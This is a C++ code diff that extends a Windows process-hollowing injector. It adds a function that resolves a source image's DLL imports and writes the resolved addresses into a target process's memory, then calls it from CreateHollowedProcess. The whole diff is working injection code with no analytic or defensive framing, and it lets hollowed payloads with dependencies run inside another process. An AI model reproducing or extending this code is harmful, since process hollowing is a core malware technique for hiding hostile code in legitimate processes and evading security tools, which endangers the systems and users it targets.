@@ -7,6 +7,109 @@
 #include "internals.h"
 #include "pe.h"
 
+namespace
+{
+
+bool ResolveImports(
+        HANDLE hProcess,
+        UINT_PTR remoteBase,
+        BYTE* pLocalImage,
+        PIMAGE_NT_HEADERS_T pSourceHeaders)
+{
+        const auto& importDirectory =
+                pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+
+        if (!importDirectory.VirtualAddress || !importDirectory.Size)
+        {
+                return true;
+        }
+
+        auto pImportDescriptor = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(
+                pLocalImage + importDirectory.VirtualAddress);
+
+        while (pImportDescriptor->Name)
+        {
+                auto pModuleName = reinterpret_cast<char*>(
+                        pLocalImage + pImportDescriptor->Name);
+
+                HMODULE hModule = GetModuleHandleA(pModuleName);
+                if (!hModule)
+                {
+                        hModule = LoadLibraryA(pModuleName);
+                }
+
+                if (!hModule)
+                {
+                        printf("Failed to load dependency %s\r\n", pModuleName);
+                        return false;
+                }
+
+                auto pLookupThunk = reinterpret_cast<PIMAGE_THUNK_DATA_T>(
+                        pLocalImage + (pImportDescriptor->OriginalFirstThunk
+                                ? pImportDescriptor->OriginalFirstThunk
+                                : pImportDescriptor->FirstThunk));
+
+                for (SIZE_T thunkIndex = 0; pLookupThunk->u1.AddressOfData; ++pLookupThunk, ++thunkIndex)
+                {
+                        FARPROC pFunction = nullptr;
+
+#ifdef _WIN64
+                        if (IMAGE_SNAP_BY_ORDINAL64(pLookupThunk->u1.Ordinal))
+                        {
+                                pFunction = GetProcAddress(
+                                        hModule,
+                                        reinterpret_cast<LPCSTR>(IMAGE_ORDINAL64(pLookupThunk->u1.Ordinal)));
+                        }
+                        else
+#else
+                        if (IMAGE_SNAP_BY_ORDINAL32(pLookupThunk->u1.Ordinal))
+                        {
+                                pFunction = GetProcAddress(
+                                        hModule,
+                                        reinterpret_cast<LPCSTR>(IMAGE_ORDINAL32(pLookupThunk->u1.Ordinal)));
+                        }
+                        else
+#endif
+                        {
+                                auto pImportByName = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(
+                                        pLocalImage + static_cast<size_t>(pLookupThunk->u1.AddressOfData));
+
+                                pFunction = GetProcAddress(hModule, reinterpret_cast<LPCSTR>(pImportByName->Name));
+                        }
+
+                        if (!pFunction)
+                        {
+                                printf("Failed to resolve import for %s\r\n", pModuleName);
+                                return false;
+                        }
+
+                        ULONG_PTR functionAddress = reinterpret_cast<ULONG_PTR>(pFunction);
+                        SIZE_T bytesWritten = 0;
+                        auto pRemoteThunk = reinterpret_cast<PVOID>(
+                                remoteBase + pImportDescriptor->FirstThunk +
+                                thunkIndex * sizeof(ULONG_PTR));
+
+                        if (!WriteProcessMemory(
+                                    hProcess,
+                                    pRemoteThunk,
+                                    &functionAddress,
+                                    sizeof(functionAddress),
+                                    &bytesWritten) ||
+                                bytesWritten != sizeof(functionAddress))
+                        {
+                                printf("Failed to write import thunk for %s\r\n", pModuleName);
+                                return false;
+                        }
+                }
+
+                ++pImportDescriptor;
+        }
+
+        return true;
+}
+
+} // namespace
+
 void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
 {
 
@@ -238,9 +341,14 @@ if (!bSuccess)
 				}
 			}
 
-			break;
-		}
+                        break;
+                }
 
+if (!ResolveImports(processInfo.hProcess, remoteBase, fileBuffer.data(), pSourceHeaders))
+{
+        printf("Failed to resolve imports\r\n");
+        return;
+}
 
 DWORD dwBreakpoint = 0xCC;
 
